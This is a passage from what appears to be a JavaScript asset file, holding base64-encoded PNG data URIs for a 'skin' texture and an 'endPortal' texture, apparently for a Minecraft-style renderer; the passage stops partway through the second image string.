    skin:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAEc0lEQVR42u1aPWsVQRR9oIIEBBUEEbRKJGijxBAMmKcphMROSZEmCDZBOwvFNEFskkoLrdLGxiaFhU1+Qv7Tmru+s5w9e2fnfSa7zxk4zO7s3X3vnLn3zuzOdDqRcv/OlcywMHst42Ocf371uBadthcQ7t67kfGxCvDhxUIJUyUAE9b622a3Qh6wa1PjAez6fP5fCMCxr6FgJEMhMBUCcI+zNxh5A4hq8rO2r1sr0yGA5gCGkTTCoXpqcgD3PHsEyK7NXS0B7a2JcSY5e/NyZcyHywMsAt+jIaNzCLazulFZHn/QACJ8zOS1xn2hiROSJz/f2hoX495k5+DNWvb701b258u7vP71fjNvezR3PfPux7nmDRYZbY3wAHVf7kkjaoSNOMgDds0jFQoJLzQaN9HB7M7IGQkjauXlk/2CtB1bsXOzsTa7x3sWh4cK1AgBtIdAiIEef/v0QQ72AAZIeUmVPYLPz10A/BGr0fMYw7+/XikmNDa0fVxdzLF6e6ZkgyEPnsDPVAH0/NwFwKyNyasIVhtpEwE1SEMgvhfP45nh3VszJTT2bXH54X7GWFpayjE/P58j+oCTkyI8WFhrs2v6fEX0+UdHWYHDw1KI5r8xbgFAHEL0IwCTZxEmIQDno7G8fI3DAyYtwMzxcUWARnnAREPglLQXAkN7wLPFg8xgP2718+WfBdCGGuDrF3/8KIF7hodR/PGQvaHUzkSJcAG07e6Woff0IwDU70cAvm6wP3tpby9HQahHFG6p7Z59iaS2hchDgO3tf4AAbNevAB5B9Q5PACNyYWcnhx0XP9yrtU3tVQQVq0KIBMmvewLwPZMQgI9BBogRUnuN6dL9dk1dXAHyLAJjUAE0JFQETVpKqNTjIgD3vidAJfZ7SQ5AQuXaA98zlAfosQrC5+rShQCU9FiAuhDwvEffPrnm7K/vLX0Pi7EY7ycHMNSFuVfV1rPXez1SLIQnQGn06XcYHFYAzeq5B6hLyzDH9q4AZO8JoG+jHBIDe4C6tybAurxgACEmB+KeN3h23lAHG8/tQ6/jQwmwvr6eGWIzNNgpdGKjYmiSq0yEhDSTN6jbx0QYWACb3na73RKpjY2NClGzUVs7Do0Q7DkQAsTUhsOHbcwTQwJovGsOGEgAwAgpQRD37Oy4bqrMIwl6NJRTWCxu14wfSoA6/MGmk0oqqaSSSiqptLbYB9AQKl+KerPOkk0qqaSSSiqppJLKWZWRF1dlBUi/ArVOgIGX10UAXl0ey/J3WzwAU92xr/+3ygNOj9kDGhkCof0F3rqit/gaXN8PLYcPuv5/1gJ4JEP7DwzB5e06EQZZ/z9rAfA9P7TEHhPA3R3ChFWQNniACsB20fX9GCLfA6LfE8YhwCj7C0Lr+6EFD10LbIQHhBZOQ7tM2F5XeOr2AnhoZQgw6tb4Y/sCGilAKAmG9hd4rl63H6BxHuCtBnvzgVCYeDFe1/ONE2DU/QUx8rE8cO4CjLq/ILa+H8sHjRBglP0FoSFPk11of8Co//8veys80xX2vS8AAAAASUVORK5CYII=",
    endPortal:"data:image/png;base64,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